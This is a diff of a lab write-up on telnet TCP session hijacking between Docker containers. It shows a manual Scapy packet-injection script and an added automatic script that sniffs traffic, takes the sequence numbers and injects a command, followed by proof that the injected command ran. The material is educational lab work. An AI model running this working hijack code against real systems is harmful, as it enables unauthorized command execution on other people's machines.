@@ -192,7 +192,7 @@ root@472341f5fb4b:/#
 
 ## Manual
 
-To hijack an existing connection we first sniff with Wireshark the needed informations (ports, flags, SEQ and ACK numbers).
+To hijack an existing connection we first sniff with Wireshark the informations needed (ports, flags, SEQ and ACK numbers).
 
 First, we want to get the **Sequence Number**: we look for the last packet sent from the client (10.9.0.6) to the server (10.9.0.5) with flags `PSH/ACK` and get both the SEQ number and the size of the payload. 
 
@@ -202,7 +202,7 @@ Then we need to find the **Acknowledgment Number**: we look for the last packet 
  #!/usr/bin/env python3
 from scapy.all import *
 
-data = "echo nano > /home/seed/prova.txt \r\n"
+data = "echo nano > /home/seed/hacked.txt \r\n"
 ip = IP(src="10.9.0.6", dst="10.9.0.5")
 tcp = TCP(sport=58264, dport=23, flags="A", seq=757678758, ack=2218560972)
 
@@ -214,7 +214,7 @@ send(pkt,verbose=0)
 With the provided code and the information we retrieved, we tried to hijack the active telnet session from the `seed-attacker` container.
 
 ```bash
-root@seed-attacker:/volumes# python3 hijack_manual_attack.py
+seed@VM:~/.../volumes$ python3 session_hijacking.py
 version    : BitField  (4 bits)                  = 4               (4)
 ihl        : BitField  (4 bits)                  = None            (None)
 tos        : XByteField                          = 0               (0)
@@ -248,6 +248,55 @@ We succeded and as a result we were able to execute malicious commands on the ta
 Also the client lost the synchronization of the SEQ and ACK numbers with the server and therefore the connection was dropped.
 
 # Automatic
+
+Remember to change the interface. Run the code after the Telnet login to the victim.
+
+```py
+#!/usr/bin/env python3
+from scapy.all import *
+
+stop_sniffing = False
+
+
+def hijack(pkt):
+    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport==23:
+        global stop_sniffing
+        src_add = pkt[IP].src
+        dst_add = pkt[IP].dst
+        ip = IP(src=src_add, dst=dst_add)
+
+        sp = pkt[TCP].sport
+        seq_n = pkt[TCP].seq
+        ack_n = pkt[TCP].ack
+        payload_l = len(pkt[TCP].payload)
+        tot_seq = seq_n+payload_l
+        tcp = TCP(sport=sp, dport=23, flags="A", seq=tot_seq, ack=ack_n)
+        data = "echo nano > /home/seed/autoHacked.txt \r\n"
+        pkt = ip/tcp/data
+        
+        send(pkt,verbose=0)
+
+        print(f"Sent ACK packet from {src_add}:{sp} to {dst_add}:23 with data={data}")
+
+        stop_sniffing = True
+
+def check_stop(pkt):
+    global stop_sniffing
+
+    return stop_sniffing
+
+pkt = sniff(iface ='br-774a3b00e93c', filter ='tcp', prn=hijack, stop_filter = check_stop)
+```
+
+### Results
+
+We can see that the command was successfully ran on the victim's system.
+
+```bash
+seed@VM:~/.../volumes$ docker exec -it victim-10.9.0.5 /bin/bash
+root@abb6db62e897:/# ls /home/seed
+autoHacked.txt
+```
 
 # TASK 4
 
